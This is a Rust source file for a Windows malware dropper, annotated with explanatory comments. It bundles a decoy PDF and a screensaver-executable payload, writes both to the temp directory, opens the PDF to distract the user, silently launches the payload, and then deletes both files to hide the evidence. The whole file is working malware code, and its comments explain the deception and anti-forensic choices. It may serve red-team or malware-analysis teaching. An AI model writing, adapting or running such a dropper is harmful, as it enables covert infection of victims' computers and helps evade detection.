use std::env::temp_dir;
use std::fs::{remove_file, File};
use std::io::Write;
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;

// # Embeds the decoy PDF file directly into the compiled executable.
// The `include_bytes!` macro reads the entire contents of a file at compile time
// and stores it as a static byte array (`&[u8]`) inside the final program.
// This means the PDF file does not need to be distributed alongside the executable.
static PDF: &[u8] = include_bytes!("../../assets/sample.pdf");

// # Embeds the malicious payload (a screensaver file, .scr) into the executable.
// Similar to the PDF, this bundles the payload within the dropper program itself,
// making the entire package a single, self-contained file.
// Screensaver files (.scr) are executables and are often used as a disguise.
static SCR: &[u8] = include_bytes!("../../assets/win_payload.scr");

fn main() {
    // # Get the path to the system's temporary directory.
    // This is a common location for programs to store temporary files.
    // Using this directory is less suspicious than writing to the current directory or a user's desktop.
    let tmp = temp_dir();

    // # Define the full path for the decoy PDF file within the temporary directory.
    // The program will write the embedded PDF data to this location.
    let pdf_path = tmp.join("sample.pdf");

    // # Define the full path for the payload file within the temporary directory.
    // A generic name like "scrn.scr" is chosen to be inconspicuous.
    let scr_path = tmp.join("scrn.scr");

    // # Write the embedded PDF data to the file system.
    // This block creates a new file at `pdf_path`. If successful, it writes the
    // entire byte array of the embedded PDF into this new file.
    // This process is often called "dropping" the file.
    if let Ok(mut file) = File::create(&pdf_path) {
        let _ = file.write_all(PDF);
    }

    // # Write the embedded payload data to the file system.
    // This does the same as the block above, but for the malicious `.scr` file.
    // After this step, both the decoy and the payload exist as actual files on the user's disk.
    if let Ok(mut file) = File::create(&scr_path) {
        let _ = file.write_all(SCR);
    }

    // # Open the decoy PDF file using the system's default PDF viewer.
    // This is the "sleight of hand" part of the program. By opening a legitimate-looking
    // document, the user is distracted and believes the program has done what was expected.
    // `Command::new("cmd").args(["/C", ...])` executes the path as if typed into the command prompt.
    // Windows will automatically use the default application for `.pdf` files.
    let _ = Command::new("cmd")
        .args(["/C", &pdf_path.to_string_lossy()])
        .spawn();

    // # Execute the malicious payload silently in the background.
    // This command runs the `.scr` file. Since `.scr` files are executable, this launches the payload.
    // Because it's launched with `spawn`, it runs as a separate, independent process.
    // The user will not see a window for this process, making it appear silent.
    let _ = Command::new("cmd")
        .args(["/C", &scr_path.to_string_lossy()])
        .spawn();

    // # Pause the dropper's execution for a short period.
    // This wait is crucial. It gives the newly spawned processes (the PDF viewer and the payload)
    // enough time to start up and lock their respective files. If we tried to delete the files
    // immediately, the operating system might still have them open, causing the deletion to fail.
    sleep(Duration::from_secs(2));

    // # Attempt to clean up by deleting the dropped files.
    // This is the final step for the dropper. It removes the decoy PDF and the payload
    // from the temporary directory to hide the evidence of its operation.
    // If the payload is well-designed, it will have already copied itself elsewhere
    // or will continue running from memory, so deleting the original `.scr` file doesn't stop it.
    let _ = remove_file(&pdf_path);
    let _ = remove_file(&scr_path);
}
